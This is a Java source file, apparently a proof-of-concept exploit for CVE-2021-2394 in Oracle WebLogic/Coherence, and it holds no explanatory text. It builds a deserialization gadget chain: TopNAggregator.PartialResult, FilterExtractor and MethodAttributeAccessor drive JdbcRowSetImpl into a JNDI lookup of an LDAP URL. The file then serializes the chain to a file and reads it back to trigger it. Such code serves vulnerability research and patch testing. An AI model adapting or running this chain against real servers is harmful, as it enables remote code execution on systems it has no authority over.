package com.r17a.weblogic.cve;


import com.sun.rowset.JdbcRowSetImpl;
import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
import com.tangosol.coherence.servlet.AttributeHolder;
import com.tangosol.util.aggregator.TopNAggregator;
import oracle.eclipselink.coherence.integrated.internal.querying.FilterExtractor;
import org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class CVE_2021_2394 {
    public static void main(String[] args) {
        try{
            JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
            jdbcRowSet.setDataSourceName("ldap://127.0.0.1:1389/cn=foo,dc=example,dc=com");

            // jdbcRowSet.getDatabaseMetaData间接调用lookup
            MethodAttributeAccessor methodAttributeAccessor = new MethodAttributeAccessor();
            methodAttributeAccessor.setGetMethodName("connect");
            methodAttributeAccessor.setSetMethodName("setConnection");
            methodAttributeAccessor.setAttributeName("xxx");

            FilterExtractor filterExtractor = new FilterExtractor();
            filterExtractor.setAccessor(methodAttributeAccessor);

            MvelExtractor mvelExtractor = new MvelExtractor("");

            TopNAggregator.PartialResult sortedBag = new TopNAggregator.PartialResult(mvelExtractor, 2);
            AttributeHolder attributeHolder = new AttributeHolder();
            sortedBag.add(jdbcRowSet);

            Field m_comparator = sortedBag.getClass().getSuperclass().getDeclaredField("m_comparator");
            m_comparator.setAccessible(true);
            m_comparator.set(sortedBag, filterExtractor);

            Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue", Object.class);
            setInternalValue.setAccessible(true);
            setInternalValue.invoke(attributeHolder, sortedBag);

            FileOutputStream fileOutputStream = new FileOutputStream(new File("E:\\test.ser"));
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
            objectOutputStream.writeObject(attributeHolder);

            FileInputStream fileInputStream = new FileInputStream(new File("E:\\test.ser"));
            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
            objectInputStream.readObject();
        }catch (Exception e){
            e.printStackTrace();
        }

    }
}
